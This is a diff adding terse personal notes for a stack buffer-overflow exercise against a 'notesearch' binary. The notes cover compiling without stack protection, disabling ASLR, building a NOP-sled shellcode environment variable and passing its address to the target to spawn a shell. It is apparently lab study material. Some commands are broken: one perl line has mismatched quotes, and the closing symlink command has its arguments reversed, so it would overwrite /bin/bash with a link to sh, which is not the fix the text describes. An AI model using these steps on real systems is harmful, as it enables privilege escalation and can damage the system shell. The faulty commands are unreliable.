@@ -1,0 +1,20 @@
+compile a .c file:
+    gcc -m32 -fno-stack-protector -z execstack -mpreferred-stack-boundary=2 -o file file.c
+
+Disable ASLR:
+    echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+
+print nop sleds in shellcode itself.
+    export SHELLCODE=$(perl -e 'print "\x90"x500')$(cat exec_shell)
+
+get the address of shellcode.
+    ./getenvaddr SHELLCODE ./notesearch
+
+print the address of shellcode.
+    ./notesearch $(perl -e print "\x......"')
+
+/bin/sh drops previlages check if: 
+    ls -la /bin/sh -->dash
+if its dash then dash drops previlages on purpose for security reasons.
+You can solve it from cmd line: sometimes sh is broken so redirect to bash.
+     sudo ln -sf /bin/sh /bin/bash
